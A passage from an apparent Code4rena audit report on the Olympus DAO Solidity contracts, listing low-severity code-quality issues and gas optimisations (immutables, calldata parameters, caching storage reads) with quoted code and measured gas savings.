1000 & 100  753:                10**reserveDecimals * RANGE.price(true, false),  // @audit: 10 754:                10**ohmDecimals * 10**PRICE.decimals()  // @audit: 10  764:                10**ohmDecimals * 10**PRICE.decimals(), // @audit: 10 765:                10**reserveDecimals * RANGE.price(true, true) // @audit: 10  784:                    10**ohmDecimals * 10**PRICE.decimals(),  // @audit: 10 785:                    10**reserveDecimals * RANGE.price(true, true)  // @audit: 10 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 ```solidity File: /src/policies/Governance.sol 164:        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT) // @audit: 10000  217:            (totalEndorsementsForProposal[proposalId_] * 100) < //@audit: 100  268:         if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) { //@audit: 100 ```   ### Non-assembly method available ```assembly { size := extcodesize() } => uint256 size = address().code.length``` We can minimize the complexity of the project by avoiding  using assembly where it's not necessary  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L31-L37 ```solidity File: /src/utils/KernelUtils.sol 31:   function ensureContract(address target_) view { 32:     uint256 size; 33:     assembly { 34:        size := extcodesize(target_) 35:    } 36:    if (size == 0) revert TargetNotAContract(target_); 37: }  ``` ### public functions not called by the contract should be declared external instead Contracts are allowed to override their parents' functions and change the visibility from external to public.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458 ```solidity File: /src/Kernel.sol 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { 452:        if (!isRole[role_]) revert Kernel_RoleDoesNotExist(role_); 453:        if (!hasRole[addr_][role_]) revert Kernel_AddressDoesNotHaveRole(addr_, role_);  455:        hasRole[addr_][role_] = false; 456: 457:        emit RoleRevoked(role_, addr_); 458:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458  ```solidity File: /src/Kernel.sol     function grantRole(Role role_, address addr_) public onlyAdmin {         if (hasRole[addr_][role_]) revert Kernel_AddressAlreadyHasRole(addr_, role_);          ensureValidRole(role_);         if (!isRole[role_]) isRole[role_] = true;          hasRole[addr_][role_] = true;          emit RoleGranted(role_, addr_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L75-L85  ```solidity File: /src/modules/TRSRY.sol     function withdrawReserves(         address to_,         ERC20 token_,         uint256 amount_     ) public {         _checkApproval(msg.sender, token_, amount_);          token_.safeTransfer(to_, amount_);          emit Withdrawal(msg.sender, to_, token_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L215-L219 ```solidity File: /src/modules/RANGE.sol     function updateMarket(         bool high_,         uint256 market_,         uint256 marketCapacity_     ) public permissioned { ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L37 ```solidity File: /src/modules/INSTR.sol 37:    function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145 ```solidity File: /src/policies/Governance.sol 145:    function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  151:    function getActiveProposal() public view returns (ActivatedProposal memory) {  ```  ### Event is missing indexed fields  Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.  7 instances https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L20-L31  ```solidity File: /src/modules/RANGE.sol 20:    event WallUp(bool high_, uint256 timestamp_, uint256 capacity_);  21:    event WallDown(bool high_, uint256 timestamp_, uint256 capacity_);  22:    event CushionUp(bool high_, uint256 timestamp_, uint256 capacity_);  23:    event CushionDown(bool high_, uint256 timestamp_);  24:    event PricesChanged( 25:        uint256 wallLowPrice_, 26:        uint256 cushionLowPrice_, 27:        uint256 cushionHighPrice_, 28:        uint256 wallHighPrice_ 29:    );  30:    event SpreadsChanged(uint256 cushionSpread_, uint256 wallSpread_);  31:    event ThresholdFactorChanged(uint256 thresholdFactor_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L26-L28 ```solidity File: /src/modules/PRICE.sol 26:    event NewObservation(uint256 timestamp_, uint256 price_, uint256 movingAverage_);  27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_);  28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L11 ```solidity File: /src/modules/INSTR.sol 11:    event InstructionsStored(uint256 instructionsId); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L51-L54 ```solidity File: /src/policies/Operator.sol 51:    event CushionFactorChanged(uint32 cushionFactor_);  52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);  53:    event ReserveFactorChanged(uint32 reserveFactor_);  54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L28-L30 ```solidity File: /src/policies/Heart.sol 28:    event Beat(uint256 timestamp_);  29:    event RewardIssued(address to_, uint256 rewardAmount_);  30:    event RewardUpdated(ERC20 token_, uint256 rewardAmount_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L86-L90 ```solidity File: /src/policies/Governance.sol 86:    event ProposalSubmitted(uint256 proposalId);  87:    event ProposalEndorsed(uint256 proposalId, address voter, uint256 amount);  88:    event ProposalActivated(uint256 proposalId, uint256 timestamp);  89:    event WalletVoted(uint256 proposalId, address voter, bool for_, uint256 userVotes);  90:    event ProposalExecuted(uint256 proposalId); ```  ### Unused named return Using both named returns and a return statement isn’t necessary in  a function.To  improve code quality, consider using only one of those.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L51-L53  ```solidity File: /src/modules/TRSRY.sol 51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 52:        return (1, 0); 53:    }  ``` https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L115-L117 ```solidity File: /src/modules/RANGE.sol 115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 116:        return (1, 0); 117:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L113-L115 ```solidity File: /src/modules/PRICE.sol 113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 114:        return (1, 0); 115:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L27-L29 ```solidity File: /src/modules/VOTES.sol 27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 28:        return (1, 0); 29:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L28-L30 ```solidity File: /src/modules/INSTR.sol 28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { 29:        return (1, 0); 30:    } ```  ### Natspec is incomplete https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234-L235 ```solidity File: /src/Kernel.sol  //@audit: Missing @param newKernel_ 75:    /// @notice Function used by kernel when migrating to a new kernel. 76:    function changeKernel(Kernel newKernel_) external onlyKernel {  //@audit: Missing @param action_ , @param target 234:    /// @notice Main kernel function. Initiates state changes to kernel depending on Action passed in. 235:    function executeAction(Actions action_, address target_) external onlyExecutor {   //@audit: Missing @param role_, @param addr_ 438:    /// @notice Function to grant policy-defined roles to some address. Can only be called by admin. 439:    function grantRole(Role role_, address addr_) public onlyAdmin {   //@audit: Missing @param role_, @param addr_ 450:    /// @notice Function to revoke policy-defined roles from some address. Can only be called by admin. 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L63-L68 ```solidity File: /src/modules/TRSRY.sol  //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 63: /// @notice Sets approval for specific withdrawer addresses 64:    function setApprovalFor( 65:        address withdrawer_, 66:        ERC20 token_, 67:        uint256 amount_ 68:    ) external permissioned {  //@audit: Missing @param token_, @param amount_ 92:    function getLoan(ERC20 token_, uint256 amount_) external permissioned {  //@audit: Missing @param token_, @param amount_ 105:    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {   //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 122:    function setDebt( 123:        ERC20 token_, 124:        address debtor_, 125:        uint256 amount_ 126:    ) external permissioned { ```   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L41-L42 ```solidity File: /src/modules/INSTR.sol  //@audit: Missing @param instructions_, @param returns  41:    /// @notice Store a list of Instructions to be executed in the future. 42:    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) { ```  ### Open todos https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L51  ```solidity File: /src/policies/TreasuryCustodian.sol  51:    // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52:    // TODO must reorg policy storage to be able to check for deactivated policies.  56:   // TODO Make sure `policy_` is an actual policy and not a random address.  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657 ```solidity File: /src/policies/Operator.sol 657:        /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary?  ```  ### Lack of event emission after critical initialize() functions  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L205 ```solidity File: /src/modules/PRICE.sol 205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ```  ### The nonReentrant modifier should occur before all other modifiers This is a best-practice to protect against reentrancy in other modifiers  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L272 ```solidity File: /src/policies/Operator.sol     function swap(         ERC20 tokenIn_,         uint256 amountIn_,         uint256 minAmountOut_     ) external override onlyWhileActive nonReentrant returns (uint256 amountOut) { ``` 
## FINDINGS  NB: *Some functions have been truncated where neccessary to just show affected parts of the code* The gas estimates are the exact results from running the tests included with an exception of internal functions(we estimate based on number of SLOADS saved) The optimizer is set to run with the default runs(200). Throught the report some places might be denoted with audit tags to show the actual place affected.  ### Using immutable on variables that are only set in the constructor and never after  Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD. Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28 ```solidity File: /src/policies/BondCallback.sol 28:    IBondAggregator public aggregator;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32 ```solidity File: /src/policies/BondCallback.sol 32:    ERC20 public ohm;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L48 ```solidity File: /src/policies/Heart.sol 48:    IOperator internal _operator; ```   ### The result of a function call should be cached rather than re-calling the function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): frequency() should be cached(Saves ~351 gas) ``` Average Gas Before: 29228       Average Gas After: 28871 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: frequency()              ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: frequency()              ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L25-L35 ### PriceConfig.sol.requestPermissions():PRICE.KEYCODE() should be cached( Saves ~1472 gas) ``` Average Gas Before: 3956       Average Gas After: 2484 ```  ```solidity File: /src/policies/PriceConfig.sol 25:    function requestPermissions() 26:        external 27:        view 28:        override 29:        returns (Permissions[] memory permissions) 30:    { 31:        permissions = new Permissions[](3); 32:        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); //@audit: PRICE.KEYCODE() 33:        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); 34:        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector); 35:    } ```  **The above can be rewriten as follows:** ```solidity     function requestPermissions()external view override returns (Permissions[] memory permissions){        Keycode PRICE_KEYCODE = PRICE.KEYCODE();         permissions = new Permissions[](3);         permissions[0] = Permissions(PRICE_KEYCODE, PRICE.initialize.selector); //@audit: PRICE.KEYCODE()         permissions[1] = Permissions(PRICE_KEYCODE, PRICE.changeMovingAverageDuration.selector);         permissions[2] = Permissions(PRICE_KEYCODE, PRICE.changeObservationFrequency.selector);     } ```  **Other Instance:** https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L27-L36 ### VoterRegistration.sol.requestPermissions():VOTES.KEYCODE() should be cached( Saves ~758 gas) ``` Average Gas Before: 2863       Average Gas After: 2105 ```  ```solidity File: /src/policies/VoterRegistration.sol 27:    function requestPermissions() 28:        external 29:        view 30:        override 31:        returns (Permissions[] memory permissions) 32:    { 33:        permissions = new Permissions[](2); 34:        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector); 35:        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector); 36:    } ```  See an existing implementation already on [Line 34](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L34-L40) for how to implement the above function ```solidity     function requestPermissions() external view override returns (Permissions[] memory requests) {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();            requests = new Permissions[](2);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);     } ```  ### Use calldata instead of memory for function parameters When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution.When arguments are read-only on external functions, the data location should be calldata:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L205 ### PRICE.sol.initialize(): uint256\[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 1933 gas) ``` Average Gas Before: 432495       Average Gas After: 430562 ```  ```solidity File: /src/modules/PRICE.sol     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         permissioned     {         if (initialized) revert Price_AlreadyInitialized();          // Cache numObservations to save gas.         uint256 numObs = observations.length;          // Check that the number of start observations matches the number expected         if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))             revert Price_InvalidParams();         // Push start observations into storage and total up observations         uint256 total;         for (uint256 i; i < numObs; ) {             if (startObservations_[i] == 0) revert Price_InvalidParams();             total += startObservations_[i];             observations[i] = startObservations_[i];             unchecked {                 ++i;             }         }         // Set moving average, last observation time, and initialized flag         _movingAverage = total / numObs;         lastObservationTime = lastObservationTime_;         initialized = true;     } ```  `startObservations_` should be declared calldata as it is readonly on this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67 ### TreasuryCustodian.sol.revokePolicyApprovals(): ERC20\[] memory tokens_should be ERC20\[] calldata tokens_(Saves ~ 114 gas) ``` Average Gas Before: 6956       Average Gas After: 6842 ```  ```solidity File: /src/policies/TreasuryCustodian.sol     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L152-L166 ### BondCallback.sol.batchToTreasury(): ERC20\[] memory tokens_should be ERC20\[] calldata tokens_(Saves ~ 186 gas) ``` Average Gas Before: 12729       Average Gas After: 12543 ```  ```solidity File: /src/policies/BondCallback.sol     function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {         ERC20 token;         uint256 balance;         uint256 len = tokens_.length;         for (uint256 i; i < len; ) {             token = tokens_[i];             balance = token.balanceOf(address(this));             token.safeTransfer(address(TRSRY), balance);             priorBalances[token] = token.balanceOf(address(this));               unchecked {                 ++i;             }         }     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45-L50 ### PriceConfig.sol.initialize(): uint256[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/PriceConfig.sol 45:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 46:        external 47:        onlyRole("price_admin") 48:    { 49:        PRICE.initialize(startObservations_, lastObservationTime_); 50:    }  ``` `uint256[] memory startObservations_` should be declared as `uint256[] calldata startObservations_` as it is readonly in this function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159-L163 ### Governance.sol.submitProposal(): string memory proposalURI_ should be string memory proposalURI_ (Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/Governance.sol 159:    function submitProposal( 160:        Instruction[] calldata instructions_, 161:        bytes32 title_, 162:        string memory proposalURI_ 163:    ) external {  ``` `string memory proposalURI_` should be declared as `string calldata proposalURI_` as it is readonly in this function  ### Caching storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs.  SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): nextObsIndex should be cached(Saves ~123 gas) ``` Average Gas before:9124   Average Gas After: 9001 ``` The gas saved ends up being higher than the estimates if we optimize the functions that are also called inside this one **(~259 gas)** ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 129:        // Get earliest observation in window 130:        uint256 earliestPrice = observations[nextObsIndex];             ... 141:        // Push new observation into storage and store timestamp taken at 142:        observations[nextObsIndex] = currentPrice; 143:        lastObservationTime = uint48(block.timestamp); 144:        nextObsIndex = (nextObsIndex + 1) % numObs;             ... 147:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L154-L180 ### PRICE.sol.getCurrentPrice(): observationFrequency should be cached(Saves ~134 gas) ``` Average Gas before:5264   Average Gas After: 5130 ```  ```solidity File: /src/modules/PRICE.sol 154:    function getCurrentPrice() public view returns (uint256) { 155:        if (!initialized) revert Price_NotInitialized();                ... 165:            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) 166:                revert Price_BadFeed(address(_ohmEthPriceFeed));                  ... 171:            if (updatedAt < block.timestamp - uint256(observationFrequency)) 172:                revert Price_BadFeed(address(_reserveEthPriceFeed));  ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): \_movingAverage should be cached(Saves 1 sload ~ 99 gas ) ``` Average Gas before:9137   Average Gas After: 9038 ```  ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 134:        // Calculate new moving average 135:        if (currentPrice > earliestPrice) { 136:            _movingAverage += (currentPrice - earliestPrice) / numObs;  //@audit: SLOAD 1 on happy path 137:        } else { 138:            _movingAverage -= (earliestPrice - currentPrice) / numObs;  //@audit: SLOAD 1 on sad path 139:        }             ... 146:        emit NewObservation(block.timestamp, currentPrice, _movingAverage);//@audit: SLOAD 2 147:    } ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L183-L187 ### PRICE.sol.getLastPrice(): nextObsIndex should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/modules/PRICE.sol 183:    function getLastPrice() external view returns (uint256) { 184:        if (!initialized) revert Price_NotInitialized(); 185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 186:        return observations[lastIndex]; 187:    }  ```  ### PRICE.sol.changeMovingAverageDuration(): observationFrequency should be cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L240-L246 ```solidity File: /src/modules/PRICE.sol 240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { 241:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 242:        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0) //@audit: SLOAD 1 243:            revert Price_InvalidParams();             ... 245:        // Calculate the new number of observations 246:        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency); //@audit: SLOAD 2 ```   ### PRICE.sol.changeObservationFrequency(): movingAverageDuration should be cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L266-L272 ```solidity File: /src/modules/PRICE.sol 266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { 267:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 268:        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0) //@audit: SLOAD 1 269:            revert Price_InvalidParams();             ... 271:        // Calculate the new number of observations 272:        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_); //@audit: SLOAD 2 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): lastBeat should be cached(Saves 1 sload ~40gas , saves ~399 if we cache the result of the external call `frequency()` )  ``` Estimations without caching the frequency function: only cache lastBeat           Average Gas before:29228   Average Gas After: 29188  Estimations after caching the frequency function: lastBeat and frequency           Average Gas before:29228   Average Gas After: 28829 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: lastBeat SLOAD 1             ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: lastBeat SLOAD 2             ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 ### Heart.sol.\_issueReward(): reward should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/policies/Heart.sol 111:    function _issueReward(address to_) internal { 112:        rewardToken.safeTransfer(to_, reward); //@audit: reward SLOAD 1 113:        emit RewardIssued(to_, reward); //@audit: reward SLOAD 2 114:    } ```  ### Other interesting places that we can utilize caching. https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262 ### Governance.sol.vote(): activeProposal.proposalId should be cached(Saves ~281 gas) ``` Average Gas Before: 61568       Average Gas After: 61287 ```  ```solidity File: /src/policies/Governance.sol 240:    function vote(bool for_) external {             ... 243:        if (activeProposal.proposalId == 0) { //@audit: activeProposal.proposalId 244:            revert NoActiveProposalDetected(); 245:        }             ... 247:        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { //@audit: activeProposal.proposalId 248:            revert UserAlreadyVoted(); 249:        }             ... 251:        if (for_) { 252:            yesVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 253:        } else { 254:            noVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 255:        }           ... 257:        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; //@audit: activeProposal.proposalId             ... 261:        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);//@audit: activeProposal.proposalId 262:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289 ### Governance.sol.executeProposal(): activeProposal.proposalId should be cached(Saves ~147gas) ``` Average Gas Before: 171376       Average Gas After: 171229 ```  ```solidity File: /src/policies/Governance.sol 265:    function executeProposal() external { 266:        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - 267:            noVotesForProposal[activeProposal.proposalId];             ...     276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);             ... 285:        emit ProposalExecuted(activeProposal.proposalId);             ... 289:    } ```  ## Internal/Private functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  Affected code:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L  ```solidity File: /src/Kernel.sol 279:    function _upgradeModule(Module newModule_) internal {  295:    function _activatePolicy(Policy policy_) internal {  325:    function _deactivatePolicy(Policy policy_) internal {  351:    function _migrateKernel(Kernel newKernel_) internal {  409:    function _pruneFromDependents(Policy policy_) internal {  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 ```solidity File: /src/policies/Heart.sol 111:    function _issueReward(address to_) internal { 112:        rewardToken.safeTransfer(to_, reward); 113:        emit RewardIssued(to_, reward); 114:    } ``` The above function is only called on [Line 106](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106)  ### Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it  To help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array.  As an example, instead of repeatedly calling ```someMap[someIndex]```, save its reference like this: ```SomeStruct storage somestruct = someMap[someIndex]``` and use it.  ### TRSRY.sol.repayLoan(): reserveDebt\[token_]\[msg.sender] should be cached https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L105-L119  ```solidity File: /src/modules/TRSRY.sol 105:    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106:        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();   108:        // Deposit from caller first (to handle nonstandard token transfers) 109:        uint256 prevBalance = token_.balanceOf(address(this)); 110:        token_.safeTransferFrom(msg.sender, address(this), amount_);  112:        uint256 received = token_.balanceOf(address(this)) - prevBalance;  114:        // Subtract debt from caller 115:        reserveDebt[token_][msg.sender] -= received;  116:        totalDebt[token_] -= received;  118:        emit DebtRepaid(token_, msg.sender, received); 119:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L236 ### Governance.sol.activateProposal(): proposalHasBeenActivated\[proposalId_] ```solidity File: /src/policies/Governance.sol 205:    function activateProposal(uint256 proposalId_) external { 206:        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];  223:        if (proposalHasBeenActivated[proposalId_] == true) {  224:            revert ProposalAlreadyActivated(); 225:        }  233:        proposalHasBeenActivated[proposalId_] = true;   236:    } ```  